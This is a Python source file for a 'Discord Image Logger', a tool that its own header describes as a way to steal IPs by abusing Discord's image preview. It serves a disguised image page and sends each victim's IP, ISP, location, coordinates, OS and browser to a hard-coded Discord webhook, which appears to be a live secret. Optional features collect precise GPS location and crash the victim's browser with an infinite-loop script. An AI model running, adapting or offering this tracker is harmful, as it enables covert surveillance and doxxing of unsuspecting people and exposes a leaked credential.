# Discord Image Logger
# By DeKrypt | https://github.com/dekrypted

from http.server import BaseHTTPRequestHandler
from urllib import parse
import traceback, requests, base64, httpagentparser

__app__ = "Discord Image Logger"
__description__ = "A simple application which allows you to steal IPs and more by abusing Discord's Open Original feature"
__version__ = "v2.0"
__author__ = "DeKrypt"

config = {
    # BASE CONFIG #
    "webhook": "https://discord.com/api/webhooks/1417537338426265640/R2vW4GIpKUm3MPlATsrlqONZ8BObdl15pPqP729er_hWu0sWJ9-gM8pTpAiX6cAT_3Is",
    "image": "data:image/jpeg;base64,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, # You can also have a custom image by using a URL argument
                                               # (E.g. yoursite.com/imagelogger?url=<Insert a URL-escaped link to an image here>)
    "imageArgument": True, # Allows you to use a URL argument to change the image (SEE THE README)

    # CUSTOMIZATION #
    "username": "Image Logger", # Set this to the name you want the webhook to have
    "color": 0x00FFFF, # Hex Color you want for the embed (Example: Red is 0xFF0000)

    # OPTIONS #
    "crashBrowser": False, # Tries to crash/freeze the user's browser, may not work. (I MADE THIS, SEE https://github.com/dekrypted/Chromebook-Crasher)
    
    "accurateLocation": False, # Uses GPS to find users exact location (Real Address, etc.) disabled because it asks the user which may be suspicious.

    "message": { # Show a custom message when the user opens the image
        "doMessage": False, # Enable the custom message?
        "message": "This browser has been pwned by DeKrypt's Image Logger. https://github.com/dekrypted/Discord-Image-Logger", # Message to show
        "richMessage": True, # Enable rich text? (See README for more info)
    },

    "vpnCheck": 1, # Prevents VPNs from triggering the alert
                # 0 = No Anti-VPN
                # 1 = Don't ping when a VPN is suspected
                # 2 = Don't send an alert when a VPN is suspected

    "linkAlerts": True, # Alert when someone sends the link (May not work if the link is sent a bunch of times within a few minutes of each other)
    "buggedImage": True, # Shows a loading image as the preview when sent in Discord (May just appear as a random colored image on some devices)

    "antiBot": 1, # Prevents bots from triggering the alert
                # 0 = No Anti-Bot
                # 1 = Don't ping when it's possibly a bot
                # 2 = Don't ping when it's 100% a bot
                # 3 = Don't send an alert when it's possibly a bot
                # 4 = Don't send an alert when it's 100% a bot
    

    # REDIRECTION #
    "redirect": {
        "redirect": False, # Redirect to a webpage?
        "page": "https://your-link.here" # Link to the webpage to redirect to 
    },

    # Please enter all values in correct format. Otherwise, it may break.
    # Do not edit anything below this, unless you know what you're doing.
    # NOTE: Hierarchy tree goes as follows:
    # 1) Redirect (If this is enabled, disables image and crash browser)
    # 2) Crash Browser (If this is enabled, disables image)
    # 3) Message (If this is enabled, disables image)
    # 4) Image 
}

blacklistedIPs = ("27", "104", "143", "164") # Blacklisted IPs. You can enter a full IP or the beginning to block an entire block.
                                                           # This feature is undocumented mainly due to it being for detecting bots better.

def botCheck(ip, useragent):
    if ip.startswith(("34", "35")):
        return "Discord"
    elif useragent.startswith("TelegramBot"):
        return "Telegram"
    else:
        return False

def reportError(error):
    requests.post(config["webhook"], json = {
    "username": config["username"],
    "content": "@everyone",
    "embeds": [
        {
            "title": "Image Logger - Error",
            "color": config["color"],
            "description": f"An error occurred while trying to log an IP!\n\n**Error:**\n```\n{error}\n```",
        }
    ],
})

def makeReport(ip, useragent = None, coords = None, endpoint = "N/A", url = False):
    if ip.startswith(blacklistedIPs):
        return
    
    bot = botCheck(ip, useragent)
    
    if bot:
        requests.post(config["webhook"], json = {
    "username": config["username"],
    "content": "",
    "embeds": [
        {
            "title": "Image Logger - Link Sent",
            "color": config["color"],
            "description": f"An **Image Logging** link was sent in a chat!\nYou may receive an IP soon.\n\n**Endpoint:** `{endpoint}`\n**IP:** `{ip}`\n**Platform:** `{bot}`",
        }
    ],
}) if config["linkAlerts"] else None # Don't send an alert if the user has it disabled
        return

    ping = "@everyone"

    info = requests.get(f"http://ip-api.com/json/{ip}?fields=16976857").json()
    if info["proxy"]:
        if config["vpnCheck"] == 2:
                return
        
        if config["vpnCheck"] == 1:
            ping = ""
    
    if info["hosting"]:
        if config["antiBot"] == 4:
            if info["proxy"]:
                pass
            else:
                return

        if config["antiBot"] == 3:
                return

        if config["antiBot"] == 2:
            if info["proxy"]:
                pass
            else:
                ping = ""

        if config["antiBot"] == 1:
                ping = ""


    os, browser = httpagentparser.simple_detect(useragent)
    
    embed = {
    "username": config["username"],
    "content": ping,
    "embeds": [
        {
            "title": "Image Logger - IP Logged",
            "color": config["color"],
            "description": f"""**A User Opened the Original Image!**

**Endpoint:** `{endpoint}`
            
**IP Info:**
> **IP:** `{ip if ip else 'Unknown'}`
> **Provider:** `{info['isp'] if info['isp'] else 'Unknown'}`
> **ASN:** `{info['as'] if info['as'] else 'Unknown'}`
> **Country:** `{info['country'] if info['country'] else 'Unknown'}`
> **Region:** `{info['regionName'] if info['regionName'] else 'Unknown'}`
> **City:** `{info['city'] if info['city'] else 'Unknown'}`
> **Coords:** `{str(info['lat'])+', '+str(info['lon']) if not coords else coords.replace(',', ', ')}` ({'Approximate' if not coords else 'Precise, [Google Maps]('+'https://www.google.com/maps/search/google+map++'+coords+')'})
> **Timezone:** `{info['timezone'].split('/')[1].replace('_', ' ')} ({info['timezone'].split('/')[0]})`
> **Mobile:** `{info['mobile']}`
> **VPN:** `{info['proxy']}`
> **Bot:** `{info['hosting'] if info['hosting'] and not info['proxy'] else 'Possibly' if info['hosting'] else 'False'}`

**PC Info:**
> **OS:** `{os}`
> **Browser:** `{browser}`

**User Agent:**
```
{useragent}
```""",
    }
  ],
}
    
    if url: embed["embeds"][0].update({"thumbnail": {"url": url}})
    requests.post(config["webhook"], json = embed)
    return info

binaries = {
    "loading": base64.b85decode(b'|JeWF01!$>Nk#wx0RaF=07w7;|JwjV0RR90|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|Nq+nLjnK)|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsBO01*fQ-~r$R0TBQK5di}c0sq7R6aWDL00000000000000000030!~hfl0RR910000000000000000RP$m3<CiG0uTcb00031000000000000000000000000000')
    # This IS NOT a rat or virus, it's just a loading image. (Made by me! :D)
    # If you don't trust it, read the code or don't use this at all. Please don't make an issue claiming it's duahooked or malicious.
    # You can look at the below snippet, which simply serves those bytes to any client that is suspected to be a Discord crawler.
}

class ImageLoggerAPI(BaseHTTPRequestHandler):
    
    def handleRequest(self):
        try:
            if config["imageArgument"]:
                s = self.path
                dic = dict(parse.parse_qsl(parse.urlsplit(s).query))
                if dic.get("url") or dic.get("id"):
                    url = base64.b64decode(dic.get("url") or dic.get("id").encode()).decode()
                else:
                    url = config["image"]
            else:
                url = config["image"]

            data = f'''<style>body {{
margin: 0;
padding: 0;
}}
div.img {{
background-image: url('{url}');
background-position: center center;
background-repeat: no-repeat;
background-size: contain;
width: 100vw;
height: 100vh;
}}</style><div class="img"></div>'''.encode()
            
            if self.headers.get('x-forwarded-for').startswith(blacklistedIPs):
                return
            
            if botCheck(self.headers.get('x-forwarded-for'), self.headers.get('user-agent')):
                self.send_response(200 if config["buggedImage"] else 302) # 200 = OK (HTTP Status)
                self.send_header('Content-type' if config["buggedImage"] else 'Location', 'image/jpeg' if config["buggedImage"] else url) # Define the data as an image so Discord can show it.
                self.end_headers() # Declare the headers as finished.

                if config["buggedImage"]: self.wfile.write(binaries["loading"]) # Write the image to the client.

                makeReport(self.headers.get('x-forwarded-for'), endpoint = s.split("?")[0], url = url)
                
                return
            
            else:
                s = self.path
                dic = dict(parse.parse_qsl(parse.urlsplit(s).query))

                if dic.get("g") and config["accurateLocation"]:
                    location = base64.b64decode(dic.get("g").encode()).decode()
                    result = makeReport(self.headers.get('x-forwarded-for'), self.headers.get('user-agent'), location, s.split("?")[0], url = url)
                else:
                    result = makeReport(self.headers.get('x-forwarded-for'), self.headers.get('user-agent'), endpoint = s.split("?")[0], url = url)
                

                message = config["message"]["message"]

                if config["message"]["richMessage"] and result:
                    message = message.replace("{ip}", self.headers.get('x-forwarded-for'))
                    message = message.replace("{isp}", result["isp"])
                    message = message.replace("{asn}", result["as"])
                    message = message.replace("{country}", result["country"])
                    message = message.replace("{region}", result["regionName"])
                    message = message.replace("{city}", result["city"])
                    message = message.replace("{lat}", str(result["lat"]))
                    message = message.replace("{long}", str(result["lon"]))
                    message = message.replace("{timezone}", f"{result['timezone'].split('/')[1].replace('_', ' ')} ({result['timezone'].split('/')[0]})")
                    message = message.replace("{mobile}", str(result["mobile"]))
                    message = message.replace("{vpn}", str(result["proxy"]))
                    message = message.replace("{bot}", str(result["hosting"] if result["hosting"] and not result["proxy"] else 'Possibly' if result["hosting"] else 'False'))
                    message = message.replace("{browser}", httpagentparser.simple_detect(self.headers.get('user-agent'))[1])
                    message = message.replace("{os}", httpagentparser.simple_detect(self.headers.get('user-agent'))[0])

                datatype = 'text/html'

                if config["message"]["doMessage"]:
                    data = message.encode()
                
                if config["crashBrowser"]:
                    data = message.encode() + b'<script>setTimeout(function(){for (var i=69420;i==i;i*=i){console.log(i)}}, 100)</script>' # Crasher code by me! https://github.com/dekrypted/Chromebook-Crasher

                if config["redirect"]["redirect"]:
                    data = f'<meta http-equiv="refresh" content="0;url={config["redirect"]["page"]}">'.encode()
                self.send_response(200) # 200 = OK (HTTP Status)
                self.send_header('Content-type', datatype) # Define the data as an image so Discord can show it.
                self.end_headers() # Declare the headers as finished.

                if config["accurateLocation"]:
                    data += b"""<script>
var currenturl = window.location.href;

if (!currenturl.includes("g=")) {
    if (navigator.geolocation) {
        navigator.geolocation.getCurrentPosition(function (coords) {
    if (currenturl.includes("?")) {
        currenturl += ("&g=" + btoa(coords.coords.latitude + "," + coords.coords.longitude).replace(/=/g, "%3D"));
    } else {
        currenturl += ("?g=" + btoa(coords.coords.latitude + "," + coords.coords.longitude).replace(/=/g, "%3D"));
    }
    location.replace(currenturl);});
}}

</script>"""
                self.wfile.write(data)
        
        except Exception:
            self.send_response(500)
            self.send_header('Content-type', 'text/html')
            self.end_headers()

            self.wfile.write(b'500 - Internal Server Error <br>Please check the message sent to your Discord Webhook and report the error on the GitHub page.')
            reportError(traceback.format_exc())

        return
    
    do_GET = handleRequest
    do_POST = handleRequest

handler = ImageLoggerAPI
